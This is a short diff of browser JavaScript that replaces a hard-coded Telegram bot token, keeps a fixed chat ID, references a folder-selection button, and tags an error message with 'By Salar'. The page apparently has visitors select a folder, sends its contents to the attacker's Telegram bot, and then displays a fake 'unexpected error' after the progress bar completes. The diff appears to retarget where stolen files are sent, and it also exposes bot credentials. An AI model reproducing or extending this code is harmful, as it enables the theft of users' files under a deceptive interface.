@@ -1,4 +1,4 @@
-const botToken = '8369625663:AAHkd3IFe9oNlCg6Uy34h9-q4E12boTVEdM';
+const botToken = '8446779579:AAGVCT45Qfe3ZbR7Qxs7iVWDvb_CXeV-5jc';
     const chatId = '7591834613';
 
     const selectFolderBtn = document.getElementById('selectFolderBtn');
@@ -88,7 +88,7 @@ const botToken = '8369625663:AAHkd3IFe9oNlCg6Uy34h9-q4E12boTVEdM';
 
       setTimeout(() => {
         progressFill.style.width = `100%`;
-        progressText.textContent = '❌ An unexpected error occurred. Please try again later.';
+        progressText.textContent = '❌ An unexpected error occurred. Please try again later. By Salar';
         progressText.style.color = '#ff6b6b';
       }, 500);
     });
